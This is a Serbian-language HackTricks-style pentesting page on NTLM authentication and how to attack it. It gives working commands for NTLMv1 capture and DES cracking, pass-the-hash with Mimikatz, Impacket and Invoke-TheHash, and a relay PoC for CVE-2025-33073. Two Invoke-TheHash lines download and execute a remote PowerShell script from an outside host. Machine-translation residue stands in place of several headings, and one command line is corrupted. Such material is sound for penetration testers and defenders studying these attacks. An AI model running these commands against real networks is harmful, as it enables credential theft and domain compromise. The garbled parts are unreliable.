# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Osnovne informacije

U okruženjima u kojima su aktivni **Windows XP i Server 2003**, koriste se LM (Lan Manager) hash-evi, iako je opštepoznato da se oni mogu lako kompromitovati. Određeni LM hash, `AAD3B435B51404EEAAD3B435B51404EE`, ukazuje na to da se LM ne koristi i predstavlja hash praznog stringa.

Podrazumevano se prvenstveno koristi protokol za autentifikaciju **Kerberos**. NTLM (NT LAN Manager) se koristi u određenim okolnostima: kada Active Directory nije prisutan, domen ne postoji, Kerberos ne funkcioniše zbog nepravilne konfiguracije ili kada se pokušava povezivanje korišćenjem IP adrese umesto važećeg hostname-a.

Prisustvo zaglavlja **"NTLMSSP"** u mrežnim paketima ukazuje na NTLM proces autentifikacije.

Podršku za protokole autentifikacije - LM, NTLMv1 i NTLMv2 - omogućava određeni DLL koji se nalazi na putanji `%windir%\Windows\System32\msv1\_0.dll`.

**Ključne tačke**:

- LM hash-evi su ranjivi, a prazan LM hash (`AAD3B435B51404EEAAD3B435B51404EE`) označava da se LM ne koristi.
- Kerberos je podrazumevani metod autentifikacije, dok se NTLM koristi samo u određenim okolnostima.
- NTLM authentication paketi mogu se prepoznati po zaglavlju "NTLMSSP".
- LM, NTLMv1 i NTLMv2 protokole podržava sistemska datoteka `msv1\_0.dll`.

## LM, NTLMv1 i NTLMv2

Možete proveriti i konfigurisati koji će se protokol koristiti:

### GUI

Pokrenite _secpol.msc_ -> Lokalne smernice -> Bezbednosne opcije -> Mrežna bezbednost: nivo autentifikacije LAN Manager-a. Postoji 6 nivoa (od 0 do 5).

![LM, NTLMv1 i NTLMv2 - GUI: Pokrenite secpol.msc - Lokalne smernice - Bezbednosne opcije - Mrežna bezbednost: nivo autentifikacije LAN Manager-a. Postoji 6 nivoa (od 0 do 5)](<../../images/image (919).png>)

### Registry

Ovo će postaviti nivo 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Moguće vrednosti:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Osnovna NTLM šema autentifikacije domena

1. **Korisnik** unosi svoje **credentials**
2. Klijentska mašina **šalje authentication request**, prosleđujući **domain name** i **username**
3. **Server** šalje **challenge**
4. **Klijent enkriptuje** **challenge** koristeći hash lozinke kao ključ i šalje ga kao response
5. **Server šalje** **Domain controlleru** **domain name, username, challenge i response**. Ako **Active Directory nije konfigurisan** ili je naziv domena jednak nazivu servera, **credentials se proveravaju lokalno**.
6. **Domain controller proverava da li je sve ispravno** i šalje informacije serveru

**Server** i **Domain Controller** mogu da kreiraju **Secure Channel** putem **Netlogon** servera, pošto Domain Controller zna lozinku servera (ona se nalazi u **NTDS.DIT** db).

### Lokalna NTLM šema autentifikacije

Autentifikacija je ista kao ona pomenuta **prethodno, ali** **server** zna **hash korisnika** koji pokušava da se autentifikuje, a koji se nalazi u **SAM** fajlu. Zato, umesto da pita Domain Controller, **server će sam proveriti** da li korisnik može da se autentifikuje.

### NTLMv1 Challenge

**Dužina challenge-a je 8 bajtova**, a **response** je dugačak 24 bajta.

**NT hash (16 bajtova)** se deli na **3 dela od po 7 bajtova** (7B + 7B + (2B+0x00\*5)): **poslednji deo se popunjava nulama**. Zatim se **challenge** zasebno **cipheruje** svakim delom, a **dobijeni** cipherovani bajtovi se **spajaju**. Ukupno: 8B + 8B + 8B = 24 bajta.

**Problemi**:

- Nedostatak **randomness-a**
- Na 3 dela može se **izvršiti napad zasebno** kako bi se pronašao NT hash
- **DES može da se crackuje**
- Treći ključ se uvek sastoji od **5 nula**.
- Za **isti challenge**, **response** će biti **isti**. Zato žrtvi možete zadati string "**1122334455667788**" kao **challenge** i napasti response koristeći **precomputed rainbow tables**.

### NTLMv1 attack

Unconstrained delegation je ređi u modernim okruženjima, ali dostupan **Print Spooler service** i dalje može da se zloupotrebi za prisiljavanje autentifikacije prema takvom hostu.

Možete zloupotrebiti neke credentials/sessions koje već imate na AD-u da **zatražite od printera da se autentifikuje** prema nekom **hostu pod vašom kontrolom**. Zatim, koristeći `metasploit auxiliary/server/capture/smb` ili `responder`, možete **podesiti authentication challenge na 1122334455667788**, uhvatiti pokušaj autentifikacije i, ako je korišćen **NTLMv1**, moći ćete da ga **crackujete**.\
Ako koristite `responder`, možete pokušati da **upotrebite flag `--lm`** kako biste pokušali da **downgrade-ujete** **authentication**.\
_Napomena: za ovu tehniku autentifikacija mora da se izvršava koristeći NTLMv1 (NTLMv2 nije validan)._

Imajte na umu da će printer tokom autentifikacije koristiti computer account, a computer accounts koriste **duge i nasumične lozinke** koje verovatno **nećete moći da crackujete** koristeći uobičajene **dictionaries**. Međutim, **NTLMv1** autentifikacija **koristi DES** ([više informacija ovde](#ntlmv1-challenge)), pa ćete, koristeći neke servise posebno namenjene za cracking DES-a, moći da ga crackujete (na primer, možete koristiti [https://crack.sh/](https://crack.sh) ili [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 se takođe može napasti pomoću [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), koji konvertuje uhvaćene NTLMv1 poruke u formate pogodne za Hashcat.<sup>[[1]](#references)</sup>

Komanda
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Nedostaje sadržaj za prevođenje. Pošaljite tekst.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Nedostaje sadržaj fajla. Pošaljite tekst koji treba da bude uključen.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Pokrenite hashcat (distribuirano je najbolje putem alata kao što je hashtopolis), jer će u suprotnom ovo trajati nekoliko dana.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
U ovom slučaju znamo da je lozinka za ovo `password`, pa ćemo za potrebe demonstracije varati:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sada treba da koristimo hashcat-utilities da konvertujemo razbijene DES ključeve u delove NTLM hash-a:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Konačno, poslednji deo:
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Pošaljite sadržaj koji treba spojiti i prevesti.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Dužina challenge-a je 8 bajtova** i **šalju se 2 odgovora**: jedan je dug **24 bajta**, dok je dužina **drugog** promenljiva.

**Prvi odgovor** se kreira šifrovanjem pomoću **HMAC_MD5** **stringa** sastavljenog od **klijenta i domena**, pri čemu se kao **ključ** koristi **hash MD4** vrednosti **NT hash**. Zatim se **rezultat** koristi kao **ključ** za šifrovanje **challenge-a** pomoću **HMAC_MD5**. Tome se dodaje **client challenge od 8 bajtova**. Ukupno: 24 B.

**Drugi odgovor** se kreira pomoću **nekoliko vrednosti** (novi client challenge, **timestamp** radi sprečavanja **replay attacks**...)

Ako imate **PCAP koji sadrži uspešnu autentifikacionu razmenu**, izdvojite domen, korisničko ime, server challenge i NTLMv2 response, formatirajte capture za Hashcat i koristite režim `5600` za pokušaj oporavka lozinke. Arhivirani praktični vodič zadržava postupak izdvajanja polja paketa, dok Hashcat-ovi primeri definišu trenutno prihvaćeni format.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Kada imate hash žrtve**, možete ga koristiti za **imitiranje njenog identiteta**.\
Potrebno je da koristite **alat** koji će **izvršiti** **NTLM autentifikaciju pomoću** tog **hash-a**, ili možete kreirati novu **sessionlogon** sesiju i **ubaciti** taj **hash** u **LSASS**, tako da se taj **hash koristi svaki put kada se izvrši NTLM autentifikacija.** To je poslednja opcija koju koristi mimikatz.

**Imajte na umu da Pass-the-Hash attacks možete izvršavati i pomoću Computer accounts.**

### **Mimikatz**

**Mora se pokrenuti kao administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
Ovo pokreće proces pod trenutnim lokalnim korisnikom, dok LSASS povezuje prosleđene kredencijale sa njegovim odlaznim mrežnim logovanjem. Zatim možete pristupiti mrežnim resursima kao prosleđeni korisnik, slično kao kod `runas /netonly`, bez poznavanja lozinke u čistom tekstu.

### Pass-the-Hash sa Linux-a

Možete dobiti izvršavanje koda na Windows mašinama koristeći Pass-the-Hash sa Linux-a.\
[**Pogledajte praktične primere izvršavanja pomoću Pass-the-Hash-a.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Kompajlirani Impacket alati za Windows

Možete preuzeti[ Impacket binarne fajlove za Windows ovde](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (U ovom slučaju morate navesti komandu; cmd.exe i powershell.exe nisu validni za dobijanje interaktivnog shell-a)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Postoji još nekoliko Impacket binarnih fajlova...

### Invoke-TheHash

PowerShell skripte možete preuzeti ovde: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Ova funkcija objedinjuje prethodne režime. Možete proslediti **više hostova**, izuzeti odabrane ciljeve i izabrati _SMBExec, WMIExec, SMBClient,_ ili _SMBEnum_. Ako izaberete **SMBExec** ili **WMIExec** bez parametra _**Command**_, funkcija samo proverava da li imate dovoljne dozvole.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Mora da se pokrene kao administrator**

Ovaj alat radi isto što i mimikatz (menja memoriju LSASS procesa).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Ručno Windows remote izvršavanje sa korisničkim imenom i lozinkom


{{#ref}}
../lateral-movement/
{{#endref}}

## Izdvajanje akreditiva sa Windows hosta

Za više informacija pogledajte [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

Internal Monologue Attack je prikrivena tehnika za izdvajanje akreditiva koja napadaču omogućava da preuzme NTLM hash-eve sa mašine žrtve **bez direktne interakcije sa LSASS procesom**. Za razliku od alata Mimikatz, koji direktno čita hash-eve iz memorije i koji endpoint security rešenja ili Credential Guard često blokiraju, ovaj napad koristi **lokalne pozive NTLM authentication paketu (MSV1_0) preko Security Support Provider Interface (SSPI)**. Napadač najpre **snižava NTLM postavke** (npr. LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) kako bi osigurao da je NetNTLMv1 dozvoljen. Zatim se predstavlja kao postojeći user token dobijen iz pokrenutih procesa i lokalno pokreće NTLM autentikaciju kako bi generisao NetNTLMv1 odgovore koristeći poznat challenge.<sup>[[4]](#references)</sup>

Nakon hvatanja ovih NetNTLMv1 odgovora, napadač može brzo da povrati originalne NTLM hash-eve koristeći **unapred izračunate rainbow tables**, što omogućava dalje Pass-the-Hash napade za lateral movement. Važno je da Internal Monologue Attack ostaje prikriven zato što ne generiše mrežni saobraćaj, ne ubacuje kod i ne pokreće direktne memory dump-ove, zbog čega ga je defenderima teže otkriti u poređenju sa tradicionalnim metodama kao što je Mimikatz.

Ako NetNTLMv1 nije prihvaćen — zbog nametnutih security policy-ja — napadač možda neće uspeti da preuzme NetNTLMv1 odgovor.

Da bi rešio ovaj slučaj, Internal Monologue alat je ažuriran: dinamički preuzima server token koristeći `AcceptSecurityContext()` kako bi i dalje **hvatio NetNTLMv2 odgovore** ako NetNTLMv1 ne uspe. Iako je NetNTLMv2 mnogo teže crack-ovati, on i dalje omogućava relay napade ili offline brute-force u ograničenim slučajevima.

PoC se može pronaći na **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay i Responder

**Detaljniji vodič za izvođenje ovih napada pročitajte ovde:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Parsiranje NTLM challenge-ova iz network capture-a

**Možete koristiti** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM i Kerberos *Reflection* preko Serialized SPN-ova (CVE-2025-33073)

Windows sadrži nekoliko mitigacija koje pokušavaju da spreče *reflection* napade, u kojima se NTLM (ili Kerberos) autentikacija koja potiče sa hosta prosleđuje nazad tom **istom** hostu radi dobijanja SYSTEM privilegija.

Microsoft je prekinuo većinu javno dostupnih chain-ova pomoću MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) i kasnijih zakrpa, međutim **CVE-2025-33073** pokazuje da se zaštite i dalje mogu zaobići zloupotrebom načina na koji **SMB client skraćuje Service Principal Names (SPN-ove)** koji sadrže *marshalled* (serialized) target-info.<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR problema
1. Napadač registruje **DNS A-record** čija labela kodira marshalled SPN – npr.
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Žrtva se navodi da se autentifikuje na taj hostname (PetitPotam, DFSCoerce itd.).
3. Kada SMB client prosledi target string `cifs/srv11UWhRCAAAAA…` funkciji `lsasrv!LsapCheckMarshalledTargetInfo`, poziv `CredUnmarshalTargetInfo` **uklanja** serialized blob, ostavljajući **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (ili ekvivalent za Kerberos) sada smatra da je target *localhost*, zato što se kratki deo hosta poklapa sa imenom računara (`SRV1`).
5. Posledično, server postavlja `NTLMSSP_NEGOTIATE_LOCAL_CALL` i ubacuje **LSASS-ov SYSTEM access-token** u context (za Kerberos se kreira subsession key označen kao SYSTEM).
6. Relay-ovanje te autentikacije pomoću `ntlmrelayx.py` **ili** `krbrelayx.py` daje puna SYSTEM prava na istom hostu.<sup>[[5]](#references)</sup>

### Brzi PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Zakrpa i mere ublažavanja
* KB zakrpa za **CVE-2025-33073** dodaje proveru u `mrxsmb.sys::SmbCeCreateSrvCall` koja blokira svaku SMB konekciju čija meta sadrži marshalled info (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Uvedite **SMB signing** kako biste sprečili reflection čak i na nezaštićenim hostovima.
* Nadzirite DNS zapise koji liče na `*<base64>...*` i blokirajte coercion vektore (PetitPotam, DFSCoerce, AuthIP...).

### Ideje za detekciju
* Mrežni capture-i sa `NTLMSSP_NEGOTIATE_LOCAL_CALL` gde se IP adresa klijenta razlikuje od IP adrese servera.
* Kerberos AP-REQ koji sadrži subsession key i client principal jednak hostname-u.
* Windows događaji 4624/4648 za SYSTEM logovanje neposredno praćeni udaljenim SMB upisima sa istog hosta.<sup>[[5]](#references)</sup>

Za lokalnu reflection varijantu iz **marta 2026.**, koja zloupotrebljava **SMB arbitrary ports** i **TCP connection reuse** za dostizanje `NT AUTHORITY\SYSTEM`, pogledajte:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat primeri hash-eva – NetNTLMv2 (režim 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell alati za Pass The Hash](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Preuzimanje NTLM hash-eva bez dodirivanja LSASS-a](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
